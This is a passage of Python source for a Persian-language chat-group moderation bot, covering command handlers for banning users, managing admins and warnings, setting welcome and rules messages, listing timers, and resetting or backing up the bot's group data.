        else:
            m = 0
            for rem in reminders:
                rem_text = rem['text']
                rem_date = rem['date']
                year, month, week, day, hour = (Year(rem_date), Month(rem_date), Week(rem_date), Day(rem_date), Hour(rem_date))
                time_pass = get_iran_timestamp() - rem_date
                str_time_pass = Time_pass(time_pass)
                mess += MPro(f'کد〔{m}〕⌯ {str_time_pass} پیش {hour} ⌯ {week} ⌯ {year}-{month}-{day} {rem_text}\n', 3)
                m += 1
        return mess

    def send_list_timer(OBJM):
        mess = MPro('لیست تایمر 〔 ⏰ 〕', 4)
        empty = True
        m = 0
        for step in OBJM['INFOOBJECT']['AUTOS']:
            empty = False
            mess += MPro(f'کد〔{m}〕')
            if 'is_loop' in step and (not step['is_loop']):
                loop_mung_use = step['loop_mung_use']
                loop_mung = step['loop_mung']
                is_loop = f' ⌯ {loop_mung_use} ⇐ {loop_mung}'
            else:
                is_loop = ' ⌯ ↻'
            if step['TYPE'] == 'intime':
                hour = step['INTIME']['hour']
                minute = step['INTIME']['minute']
                mess += MPro(f'تایمر : {hour}:{minute} {is_loop}')
            elif step['TYPE'] == 'pertime':
                per = int(step['PERTIME']['per'])
                mess += MPro(f'تایمر : {per} {is_loop}')
            coms = ''
            first_cmd = True
            for com in step['COMMANDS']:
                if first_cmd:
                    first_cmd = False
                else:
                    coms += ' > '
                coms += com
            mess += MPro(f'دستورات : {coms}\n')
            m += 1
        if empty:
            mess += MPro('دستوری تایمر بندی نشده است.')
        return mess

    def update_list_admins(OBJM):
        has_continue, next_start_id, count, ADMINS = (True, None, 0, {})
        mess = MPro('درحال اپدیت...' + OBJM['INFOOBJECT']['types']['ok'])
        send_message(OBJM, mess, message_id=OBJM['message_id'])
        while has_continue:
            if OBJM['object_guid'] not in INFOS or not INFOS[OBJM['object_guid']]['state']:
                break
            result = client.get_admin_members(OBJM['object_guid'], next_start_id)
            time.sleep(0.2)
            has_continue = result['has_continue']
            if 'next_start_id' in result:
                next_start_id = result['next_start_id']
            for admin in result['in_chat_members']:
                count += 1
                if 'first_name' in admin:
                    ADMINS[admin['member_guid']] = admin['first_name']
                else:
                    ADMINS[admin['member_guid']] = 'بدون نام'
        INFOS[OBJM['object_guid']]['admins'] = ADMINS
        if count == 0:
            mess = MPro('لیست ادمین خالی است.' + OBJM['INFOOBJECT']['types']['ok'], 3)
        else:
            mess = MPro(f'لیست ادمین اپدیت شد.' + OBJM['INFOOBJECT']['types']['ok']) + MPro(f'تعداد ادمین ها : {count}', 3)
        return mess

    def delete_managing_messages(OBJM):
        if len(STMessages[OBJM['object_guid']]) > 0:
            messages_id = []
            m = 0
            for msid in STMessages[OBJM['object_guid']]:
                if m < 20:
                    messages_id.append(msid)
                    m += 1
            try:
                client.delete_messages(OBJM['object_guid'], messages_id)
            except Exception:
                pass
            messages_id = []
        INFOS[OBJM['object_guid']] = INFOS[OBJM['object_guid']]
        mess = MPro('پیام مدیریتی حذف شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return mess

    def delete_robot_messages(OBJM):
        if len(ARMessages[OBJM['object_guid']]) > 0:
            client.delete_messages(OBJM['object_guid'], ARMessages[OBJM['object_guid']])
            ARMessages[OBJM['object_guid']] = []
        mess = MPro('پیام ربات حذف شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return mess

    def recheck_joining(OBJM):
        if OBJM['object_guid'] in CheckJoins:
            CheckJoins[OBJM['object_guid']] = {}
        else:
            CheckJoins[OBJM['object_guid']] = {}
        mess = MPro('عضویت مجدد بررسی میشود. ' + OBJM['INFOOBJECT']['types']['ok'])
        return mess

    def ban_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid == OWNER:
                return MPro('ایشون سازنده من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == OBJM['INFOOBJECT']['owner']:
                return MPro('ایشون مالک من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == GUIDME:
                return MPro('ایشون من هستم. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid in OBJM['INFOOBJECT']['full_admins']:
                return MPro('ایشون ادمین ویژه است. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid in OBJM['INFOOBJECT']['admins']:
                return MPro('ایشون ادمین است. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid:
                resetUser(user_guid, OBJM['object_guid'])
                client.ban_member(OBJM['object_guid'], user_guid)
                first_name = check_name(OBJM['object_guid'], user_guid)
                return MPro(f'کاربر @@ {first_name} @@({user_guid}) بن شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def pin_message_reply(OBJM):
        client.pin_message(OBJM['object_guid'], OBJM['is_reply_message'])
        return MPro('پین شد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def add_admin_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid == OWNER:
                return MPro('ایشون سازنده من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == OBJM['INFOOBJECT']['owner']:
                return MPro('ایشون مالک من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == GUIDME:
                return MPro('ایشون من هستم. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid in OBJM['INFOOBJECT']['full_admins']:
                return MPro('ایشون ادمین ویژه است. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid in OBJM['INFOOBJECT']['admins']:
                return MPro('ایشون ادمین است. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid:
                client.set_admin(OBJM['object_guid'], user_guid)
                first_name = check_name(OBJM['object_guid'], user_guid)
                INFOS[OBJM['object_guid']]['admins'][user_guid] = first_name
                return MPro(f'کاربر @@ {first_name} @@({user_guid}) ادمین شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def unadd_admin_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid == OWNER:
                return MPro('ایشون سازنده من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == OBJM['INFOOBJECT']['owner']:
                return MPro('ایشون مالک من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == GUIDME:
                return MPro('ایشون من هستم. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid in OBJM['INFOOBJECT']['full_admins']:
                return MPro('ایشون ادمین ویژه است. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid not in OBJM['INFOOBJECT']['admins']:
                return MPro('ایشون ادمین نیست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid:
                try:
                    client.unset_admin(OBJM['object_guid'], user_guid)
                except:
                    pass
                first_name = check_name(OBJM['object_guid'], user_guid)
                return MPro(f'کاربر @@ {first_name} @@({user_guid}) برکنار شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def add_silent_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid == OWNER:
                return MPro('ایشون سازنده من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == OBJM['INFOOBJECT']['owner']:
                return MPro('ایشون مالک من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == GUIDME:
                return MPro('ایشون من هستم. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid in OBJM['INFOOBJECT']['full_admins']:
                return MPro('ایشون ادمین ویژه است. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid in OBJM['INFOOBJECT']['admins']:
                return MPro('ایشون ادمین است. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid:
                if user_guid not in USERS[OBJM['object_guid']]:
                    getInfoUser(OBJM['object_guid'], user_guid)
                first_name = check_name(OBJM['object_guid'], user_guid)
                if user_guid in INFOS[OBJM['object_guid']]['silent_list']:
                    return MPro(f'کاربر @@ {first_name} @@({user_guid}) در لیست سکوت بود. '+ OBJM['INFOOBJECT']['types']['ok'])
                INFOS[OBJM['object_guid']]['silent_list'][user_guid] = first_name
                return MPro(f'کاربر @@ {first_name} @@({user_guid}) به لیست سکوت اضافه شد. '+ OBJM['INFOOBJECT']['types']['ok'])
        return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def add_exempt_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid == OWNER:
                return MPro('ایشون سازنده من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == OBJM['INFOOBJECT']['owner']:
                return MPro('ایشون مالک من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == GUIDME:
                return MPro('ایشون من هستم. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid in OBJM['INFOOBJECT']['full_admins']:
                return MPro('ایشون ادمین ویژه است. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid in OBJM['INFOOBJECT']['admins']:
                return MPro('ایشون ادمین است. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid:
                first_name = check_name(OBJM['object_guid'], user_guid)
                if user_guid in INFOS[OBJM['object_guid']]['exempt_list']:
                    return MPro(f'کاربر @@ {first_name} @@({user_guid}) در لیست معاف بود. '+ OBJM['INFOOBJECT']['types']['ok'])
                INFOS[OBJM['object_guid']]['exempt_list'][user_guid] = first_name
                return MPro(f'کاربر @@ {first_name} @@({user_guid}) به لیست معاف اضافه شد. '+ OBJM['INFOOBJECT']['types']['ok'])
        return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def add_kill_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid == OWNER:
                return MPro('ایشون سازنده من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == OBJM['INFOOBJECT']['owner']:
                return MPro('ایشون مالک من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == GUIDME:
                return MPro('ایشون من هستم. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid in OBJM['INFOOBJECT']['full_admins']:
                return MPro('ایشون ادمین ویژه است. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid in OBJM['INFOOBJECT']['admins']:
                return MPro('ایشون ادمین است. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid:
                if user_guid not in USERS[OBJM['object_guid']]:
                    getInfoUser(OBJM['object_guid'], user_guid)
                first_name = check_name(OBJM['object_guid'], user_guid)
                if user_guid in INFOS[OBJM['object_guid']]['black_list']:
                    return MPro(f'کاربر @@ {first_name} @@({user_guid}) در لیست کیل بود. '+ OBJM['INFOOBJECT']['types']['ok'])
                INFOS[OBJM['object_guid']]['black_list'][user_guid] = first_name
                return MPro(f'کاربر @@ {first_name} @@({user_guid}) به لیست کیل اضافه شد. '+ OBJM['INFOOBJECT']['types']['ok'])
        return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def give_warning_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid == OWNER:
                return MPro('ایشون سازنده من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == OBJM['INFOOBJECT']['owner']:
                return MPro('ایشون مالک من هست. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid == GUIDME:
                return MPro('ایشون من هستم. ' + OBJM['INFOOBJECT']['types']['ok'])
            if user_guid in OBJM['INFOOBJECT']['full_admins']:
                return MPro('ایشون ادمین ویژه است. ' + OBJM['INFOOBJECT']['types']['ok'])
            isadmin = False
            if user_guid in OBJM['INFOOBJECT']['admins']:
                isadmin = True
            count = INFOS[OBJM['object_guid']]['warnning']
            first_name = check_name(OBJM['object_guid'], user_guid)
            pscount = USERS[OBJM['object_guid']][user_guid][1]
            pscount += 1
            if pscount >= count:
                if isadmin:
                    del INFOS[OBJM['object_guid']]['admins'][user_guid]
                    try:
                        client.unset_admin(OBJM['object_guid'], user_guid)
                    except:
                        pass
                else:
                    USERS[OBJM['object_guid']][user_guid][1] = 1
                    INFOS[OBJM['object_guid']]['ban'] += 1
                    ban_member_data = client.ban_member(OBJM['object_guid'], user_guid)
                    if 'data' in ban_member_data:
                        ban_member_data = ban_member_data['data']
                    try:
                        reply_message_banded_id = ban_member_data['chat_update']['chat']['last_message']['message_id']
                    except:
                        pass
                    resetUser(user_guid, OBJM['object_guid'])
                    if int(OBJM['SETTING_KEYS'][8]):
                        mess = INFOS[OBJM['object_guid']]['bye']
            USERS[OBJM['object_guid']][user_guid][1] = pscount
            if int(OBJM['SETTING_KEYS'][6]):
                mess = f'کاربر @@ {first_name} @@({user_guid}) 〔{pscount}/{count}〕⚠️'
            else:
                mess = f'کاربر @@ {first_name} @@({user_guid}) 〔{pscount}/{count}〕🚫'
            return mess
        return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def get_status_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                first_name = check_name(OBJM['object_guid'], user_guid)
                rank = formrank(Coder, OBJM['INFOOBJECT']['admins'], OBJM['INFOOBJECT']['full_admins'], OBJM['INFOOBJECT']['owner'], OWNER, user_guid)
                mess = MPro(f'مقام 〔 {rank} 〕', 4)
                user = client.get_chat_info(user_guid)['user']
                mess += manage_info(user)
                if user_guid not in USERS[OBJM['object_guid']]:
                    getInfoUser(OBJM['object_guid'], user_guid)
                mess += formInfo(USERS[OBJM['object_guid']][user_guid], OBJM, user_guid)
                mess += '\n─┅━━━━━━━┅─'
                if 'bio' in user:
                    mess += f"\n\n{user['bio']}"
                return mess
        return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def unban_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                resetUser(user_guid, OBJM['object_guid'])
                client.unban_member(OBJM['object_guid'], user_guid)
                first_name = check_name(OBJM['object_guid'], user_guid)
                return MPro(f'کاربر @@ {first_name} @@({user_guid}) رفع محدودیت شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def remove_warning_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                resetUser(user_guid, OBJM['object_guid'])
                first_name = check_name(OBJM['object_guid'], user_guid)
                return MPro(f'اخطار @@ {first_name} @@({user_guid}) حدف شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def remove_silent_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                first_name = check_name(OBJM['object_guid'], user_guid)
                if user_guid in INFOS[OBJM['object_guid']]['silent_list']:
                    del INFOS[OBJM['object_guid']]['silent_list'][user_guid]
                    return MPro(f'کاربر @@ {first_name} @@({user_guid}) از لیست سکوت حذف شد. '+ OBJM['INFOOBJECT']['types']['ok'])
                else:
                    return MPro(f'کاربر @@ {first_name} @@({user_guid}) در لیست سکوت یافت نشد. '+ OBJM['INFOOBJECT']['types']['ok'])
        return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def remove_kill_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                first_name = check_name(OBJM['object_guid'], user_guid)
                if user_guid in INFOS[OBJM['object_guid']]['black_list']:
                    INFOS[OBJM['object_guid']]['black_list'].pop(user_guid, None)
                    return MPro(f'کاربر @@ {first_name} @@({user_guid}) از لیست کیل حذف شد. ' + OBJM['INFOOBJECT']['types']['ok'])
                else:
                    return MPro(f'کاربر @@ {first_name} @@({user_guid}) در لیست کیل یافت نشد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def add_nickname_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                if user_guid in USERS[OBJM['object_guid']]:
                    USERS[OBJM['object_guid']][user_guid] = [0, 0, message_info['text'], 'ناشناس']
                else:
                    USERS[OBJM['object_guid']][user_guid][2] = 2
                return MPro('لقب ثبت شد. ' + OBJM['INFOOBJECT']['types']['ok'], 2)
            else:
                return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'], 2)
        else:
            return MPro('روی پیام پاک شده ریپلای زدی. ' + OBJM['INFOOBJECT']['types']['ok'], 2)

    def remove_nickname_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                if user_guid in USERS[OBJM['object_guid']]:
                    USERS[OBJM['object_guid']][user_guid] = [0, 0, 'بدون لقب', 'ناشناس']
                else:
                    USERS[OBJM['object_guid']][user_guid][2] = 2
                return MPro('لقب حذف شد. ' + OBJM['INFOOBJECT']['types']['ok'], 2)
            else:
                return MPro('کاربر شناسایی نشد. ' + OBJM['INFOOBJECT']['types']['ok'], 2)
        else:
            return MPro('روی پیام پاک شده ریپلای زدی. ' + OBJM['INFOOBJECT']['types']['ok'], 2)

    def update_group(OBJM):
        client_info = client.get_chat_info(OBJM['object_guid'])
        group_title = client_info['group']['group_title']
        INFOS[OBJM['object_guid']]['name'] = group_title
        return MPro('اطلاعات گروه اپدیت شد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def add_info_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                if user_guid in USERS[OBJM['object_guid']]:
                    USERS[OBJM['object_guid']][user_guid] = [0, 0, 'بدون لقب', message_info['text']]
                else:
                    USERS[OBJM['object_guid']][user_guid][3] = 3
                return MPro('اصل ثبت شد. '+ OBJM['INFOOBJECT']['types']['ok'], 2)
            else:
                return MPro('کاربر شناسایی نشد. '+ OBJM['INFOOBJECT']['types']['ok'], 2)
        else:
            return MPro('روی پیام پاک شده ریپلای زدی. '+ OBJM['INFOOBJECT']['types']['ok'], 2)

    def remove_info_user_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                if user_guid in USERS[OBJM['object_guid']]:
                    USERS[OBJM['object_guid']][user_guid] = [0, 0, 'بدون لقب', 'ناشناس']
                else:
                    USERS[OBJM['object_guid']][user_guid][3] = 3
                return MPro('اصل حذف شد. '+ OBJM['INFOOBJECT']['types']['ok'], 2)
            else:
                return MPro('کاربر شناسایی نشد. '+ OBJM['INFOOBJECT']['types']['ok'], 2)
        else:
            return MPro('روی پیام پاک شده ریپلای زدی. '+ OBJM['INFOOBJECT']['types']['ok'], 2)

    def set_welcome_message_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            tag_media = ''
            result = save_media_pro(OBJM, True)
            if result:
                tag_media = f'#{result}'
            INFOS[OBJM['object_guid']]['welcome'] = f"{message_info['text']} {tag_media}".strip()
            return MPro(f"خوشامدگویی تنظیم شد. {OBJM['INFOOBJECT']['types']['ok']}", 2)
        else:
            return MPro(f"روی پیام پاک شده ریپلای زدی. {OBJM['INFOOBJECT']['types']['ok']}", 2)

    def set_bye_message_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            tag_media = ''
            result = save_media_pro(OBJM, True)
            if result:
                tag_media = f'#{result}'
            INFOS[OBJM['object_guid']]['bye'] = f"{message_info['text']} {tag_media}".strip()
            return MPro(f"خدافظی تنظیم شد. {OBJM['INFOOBJECT']['types']['ok']}", 2)
        else:
            return MPro(f"روی پیام پاک شده ریپلای زدی. {OBJM['INFOOBJECT']['types']['ok']}", 2)

    def set_rules_group_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            tag_media = ''
            result = save_media_pro(OBJM, True)
            if result:
                tag_media = f'#{result}'
            INFOS[OBJM['object_guid']]['rols'] = f"{message_info['text']} {tag_media}".strip()
            return MPro(f"قوانین تنظیم شد. {OBJM['INFOOBJECT']['types']['ok']}", 2)
        else:
            return MPro(f"روی پیام پاک شده ریپلای زدی. {OBJM['INFOOBJECT']['types']['ok']}", 2)

    def add_banner_reply(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if message_info:
            banner_message = message_info['text']
            INFOS[OBJM['object_guid']]['baner'] = banner_message
            return MPro('بنر تنظیم شد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return MPro('روی پیام پاک شده ریپلای زدی. ' + OBJM['INFOOBJECT']['types']['ok'])

    def left_form_group(OBJM):
        leave_from_group(client, OBJM['object_guid'])
        time.sleep(0.2)
        try:
            client.send_text(OBJM['guid_sender'], MPro('لفت دادم. ' + OBJM['INFOOBJECT']['types']['ok']))
        except Exception:
            pass
        return False

    def reset_bot_group(OBJM):
        if OBJM['object_guid'] in INFOS:
            INFOS.pop(OBJM['object_guid'])
        if OBJM['object_guid'] in USERS:
            USERS.pop(OBJM['object_guid'])
        if OBJM['object_guid'] in LSMessage:
            LSMessage.pop(OBJM['object_guid'])
        if OBJM['object_guid'] in ARMessages:
            ARMessages.pop(OBJM['object_guid'])
        if OBJM['object_guid'] in STMessages:
            STMessages.pop(OBJM['object_guid'])
        if OBJM['object_guid'] in Spam:
            Spam.pop(OBJM['object_guid'])
        if OBJM['object_guid'] in JoindUsers:
            JoindUsers.pop(OBJM['object_guid'])
        if OBJM['object_guid'] in CheckJoins:
            CheckJoins.pop(OBJM['object_guid'])
        UPFILES(file_infos, INFOS)
        UPFILES(file_users, USERS)
        UPFILES(file_speakx, SPEAKX)
        client.send_text(OBJM['object_guid'], MPro('تمام اطلاعات ربات پاک شد. ' + OBJM['INFOOBJECT']['types']['ok']), OBJM['message_id'])
        return False

    def reset_info_group(OBJM):
        if OBJM['object_guid'] in INFOS:
            INFOS.pop(OBJM['object_guid'])
        if OBJM['object_guid'] in LSMessage:
            LSMessage.pop(OBJM['object_guid'])
        if OBJM['object_guid'] in ARMessages:
            ARMessages.pop(OBJM['object_guid'])
        if OBJM['object_guid'] in STMessages:
            STMessages.pop(OBJM['object_guid'])
        if OBJM['object_guid'] in Spam:
            Spam.pop(OBJM['object_guid'])
        if OBJM['object_guid'] in JoindUsers:
            JoindUsers.pop(OBJM['object_guid'])
        if OBJM['object_guid'] in CheckJoins:
            CheckJoins.pop(OBJM['object_guid'])
        UPFILES(file_infos, INFOS)
        client.send_text(OBJM['object_guid'], MPro('تمام اطلاعات گروه پاک شد. ' + OBJM['INFOOBJECT']['types']['ok']), OBJM['message_id'])
        return False

    def reset_users_group(OBJM):
        USERS[OBJM['object_guid']] = {}
        UPFILES(file_users, USERS)
        return MPro('تمام امار گروه ریست شد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def reset_words(OBJM):
        global SPEAKX
        SPEAKX = {}
        UPFILES(file_speakx, SPEAKX)
        return MPro('کلمات سخنگوی شخصی حذف شد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def send_reset_bot_group_message(OBJM):
        return MPro('🛑 درصورت ریست کردن ربات تمام اطلاعات ربات ( امار گپ و اطلاعات گپ ) پاک خواهد شد!\n\nاگر مطمئن هستید لطفاً دستور زیر رو ارسال کن.\n' + '``RESETBOT ``', 2)

    def send_reset_info_group_message(OBJM):
        return MPro('🛑 اگر مطمئن هستید لطفاً دستور زیر رو ارسال کن.\n' + '``RESETINFO ``', 2)

    def send_reset_users_group_message(OBJM):
        return MPro('🛑 اگر مطمئن هستید لطفاً دستور زیر رو ارسال کن.\n' + '``RESETUSERS ``', 2)

    def send_reset_words_message(OBJM):
        return MPro('🛑 درصورت ریست کردن کلمات تمام کلمات سخنگو شخصی پاک خواهد شد!\n\nاگر مطمئن هستید لطفاً دستور زیر رو ارسال کن.\n') + MPro('``RESETWORDS ``', 3)

    def send_list_words(OBJM):
        global SPEAKX
        mess = MPro('لیست کلمات', 4)
        nkeys, nans = (0, 0)
        caption = mess
        for TIP_ANS in SPEAKX:
            SPEAK = SPEAKX[TIP_ANS]
            rank = Rank_user(TIP_ANS, OBJM)
            for word in SPEAK:
                nkeys += 1
                nans += int(len(SPEAK[word]))
                empty = False
                mess += '\n'
                if TIP_ANS.startswith('u0'):
                    mess += MPro(f'{word} - @@{rank}@@({TIP_ANS})', 2)
                else:
                    mess += MPro(f'{word} - {rank}', 2)
                mess += '\n'
                for step in SPEAK[word]:
                    if 'answer' in step:
                        mess += MPro(step['answer'], 1)
                    if 'actions' in step:
                        form_actions = ''
                        for action in step['actions']:
                            if len(form_actions) > 0:
                                form_actions += f' - {action}'
                            else:
                                form_actions += f'{action}'
                        if len(form_actions) > 0:
                            mess += MPro(form_actions, 4)
                mess += '\n'
        caption += MPro(f'کلیدواژه : 〔 {str(nkeys)} 〕', 1)
        caption += MPro(f'جواب : 〔 {str(nans)} 〕', 1)
        lword = 'listWords.txt'
        with open(lword, 'w', encoding='utf-8') as file:
            file.write(mess)
        client.send_file(OBJM['object_guid'], lword, OBJM['message_id'], caption)
        return None

    def send_file_words(OBJM):
        try:
            client.send_file(OBJM['object_guid'], file_speakx, OBJM['message_id'], 'فایل کلمات شخصی')
        except Exception:
            return MPro('ظاهرا همچین فایلی وجود ندارد. ' + OBJM['INFOOBJECT']['types']['ok'])
        return None

    def send_file_users(OBJM):
        try:
            client.send_file(OBJM['object_guid'], file_users, OBJM['message_id'], 'فایل امار')
        except Exception:
            return MPro('ظاهرا همچین فایلی وجود ندارد ' + OBJM['INFOOBJECT']['types']['ok'])
        return None

    def send_file_infos(OBJM):
        try:
            client.send_file(OBJM['object_guid'], file_infos, OBJM['message_id'], 'فایل گروه')
        except Exception:
            return MPro('ظاهرا همچین فایلی وجود ندارد ' + OBJM['INFOOBJECT']['types']['ok'])
        return None

    def deleting_fulladmins_group(OBJM):
        INFOS[OBJM['object_guid']]['full_admins'] = {}
        return MPro('لیست ویژه پاکسازی شد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def deleting_blacklist_group(OBJM):
        has_continue, next_start_id = (True, None)
        mess = MPro('درحال پاکسازی... ' + OBJM['INFOOBJECT']['types']['ok'])
        send_message(OBJM, mess, OBJM['message_id'])
        count = 0
        listBannded = []
        while has_continue:
            if OBJM['object_guid'] not in INFOS or not INFOS[OBJM['object_guid']]['state']:
                break
            result = client.get_banned_members(OBJM['object_guid'], next_start_id)
            time.sleep(0.2)
            listBannded = result['in_chat_members']
            for x in listBannded:
                member_guid = x['member_guid']
                resetUser(member_guid, OBJM['object_guid'])
                client.unban_member(OBJM['object_guid'], member_guid)
            count += len(listBannded)
            has_continue = 'next_start_id' in result
            if has_continue:
                next_start_id = result['next_start_id']
        if count == 0:
            return MPro('لیست سیاه خالی است. ' + OBJM['INFOOBJECT']['types']['ok'])
        return MPro('لیست سیاه پاکسازی شد' + OBJM['INFOOBJECT']['types']['ok']) + MPro('تعداد پاک شده : ' + str(count), 3)

    def updat_data_bot(OBJM=None):
        UPFILES(file_infos, INFOS)
        UPFILES(file_users, USERS)
        UPFILES(file_speakx, SPEAKX)
        return MPro('دیتا سیو شد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def backup_data_bot(OBJM):
        UPFILES(file_infos, INFOS)
        UPFILES(file_users, USERS)
        UPFILES(file_speakx, SPEAKX)
        return MPro('بکاپ از فایل ها گرفته شد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def list_media_form(OBJM):
        mess = MPro('لیست رسانه', 4)
        mess += MPro('لیست گیف', 2)
        mess += MPro('لیست ویس', 2)
        mess += MPro('لیست اهنگ', 2)
        mess += MPro('لیست عکس', 2)
        mess += MPro('لیست فیلم', 2)
        return mess

    def list_tag_form(OBJM):
        mess = MPro('لیست تگ ها', 4)
        mess += MPro('#اسم_کاربر / #اسم', 2)
        mess += MPro('#اسم_گروه / #اسم_گپ', 2)
        mess += MPro('#اسم_ریپلای', 2)
        mess += MPro('#اسم_ربات', 2)
        mess += MPro('#اسم_سازنده', 2)
        mess += MPro('#اسم_مالک', 2)
        mess += MPro('#اسم_تصادفی', 2)
        mess += MPro('#لینک_گروه / #لینک_گپ', 2)
        mess += MPro('#گوید_کاربر / #گوید', 2)
